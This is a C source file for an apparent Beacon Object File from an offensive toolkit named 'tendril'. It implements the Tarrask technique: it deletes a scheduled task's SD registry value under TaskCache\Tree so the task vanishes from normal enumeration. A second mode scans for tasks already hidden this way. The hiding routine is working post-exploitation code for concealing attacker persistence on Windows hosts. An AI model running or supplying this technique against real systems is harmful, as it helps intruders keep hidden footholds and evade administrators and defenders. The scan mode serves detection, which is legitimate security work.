/*
 * tendril-ghost-task BOF
 * Hides an existing scheduled task by removing its SD value (Tarrask technique)
 * Or checks for ghost tasks (tasks with missing SD values)
 *
 * Arguments (packed):
 *   wstr taskName - task name in TaskCache\Tree
 *   short action  - 0 = ghost (remove SD), 1 = restore (not implemented), 2 = check all
 */
#include "tendril.h"

#define TASK_CACHE_TREE L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree"

void go(char* args, int alen)
{
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int nameLen;
    wchar_t* taskName = (wchar_t*)BeaconDataExtract(&parser, &nameLen);
    short action      = BeaconDataShort(&parser);

    if (action == 0) /* ghost: remove SD from a named task */
    {
        wchar_t keyPath[512];
        KERNEL32$lstrcpyW(keyPath, TASK_CACHE_TREE);
        KERNEL32$lstrcatW(keyPath, L"\\");
        KERNEL32$lstrcatW(keyPath, taskName);

        LSTATUS s = tendril_reg_delete_value(HKEY_LOCAL_MACHINE, keyPath, L"SD");
        if (s == ERROR_SUCCESS)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Task ghosted (SD removed): %ls", taskName);
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to remove SD (error %d) - admin required", s);
    }
    else if (action == 2) /* check: enumerate tasks with missing SD */
    {
        HKEY hTree;
        LSTATUS s = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, TASK_CACHE_TREE, 0,
            KEY_READ | KEY_WOW64_64KEY, &hTree);
        if (s != ERROR_SUCCESS)
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Cannot open TaskCache\\Tree: %d", s);
            return;
        }

        DWORD index = 0;
        wchar_t name[256];
        DWORD nameLen2;
        int ghostCount = 0;

        while (1)
        {
            nameLen2 = 256;
            s = ADVAPI32$RegEnumKeyExW(hTree, index, name, &nameLen2, NULL, NULL, NULL, NULL);
            if (s != ERROR_SUCCESS) break;
            index++;

            /* Open the task subkey and check for SD value */
            HKEY hTask;
            wchar_t subPath[512];
            KERNEL32$lstrcpyW(subPath, TASK_CACHE_TREE);
            KERNEL32$lstrcatW(subPath, L"\\");
            KERNEL32$lstrcatW(subPath, name);

            s = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, subPath, 0,
                KEY_READ | KEY_WOW64_64KEY, &hTask);
            if (s != ERROR_SUCCESS) continue;

            DWORD sdSize = 0;
            DWORD sdType;
            s = ADVAPI32$RegQueryValueExW(hTask, L"SD", NULL, &sdType, NULL, &sdSize);
            ADVAPI32$RegCloseKey(hTask);

            if (s == ERROR_FILE_NOT_FOUND)
            {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] GHOST TASK (no SD): %ls", name);
                ghostCount++;
            }
        }

        ADVAPI32$RegCloseKey(hTree);

        if (ghostCount == 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[*] No ghost tasks found");
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Found %d ghost task(s)", ghostCount);
    }
}
